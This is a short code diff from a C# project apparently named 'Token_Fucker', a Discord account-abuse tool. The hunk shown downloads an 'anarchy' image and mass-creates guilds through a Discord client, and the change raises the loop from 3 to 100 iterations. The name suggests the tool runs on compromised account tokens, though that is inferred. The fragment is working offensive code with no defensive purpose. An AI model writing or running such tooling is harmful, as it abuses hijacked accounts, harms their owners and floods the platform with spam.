@@ -99,7 +99,7 @@ namespace Token_Fucker
             // Mass Create Guilds
             using (WebClient webClient = new WebClient())
                 webClient.DownloadFile("https://gblobscdn.gitbook.com/spaces%2F-M9yNp3uGfRW04W_P6dE%2Favatar-1592659338854.png", "anarchy.png");
-            for (int amount = 0; amount < 3; amount++)
+            for (int amount = 0; amount < 100; amount++)
             {
                 client.CreateGuild(guildname, (DiscordImage)Image.FromFile("anarchy.png"), "europe");
                 Console.WriteLine("Created a guild.");
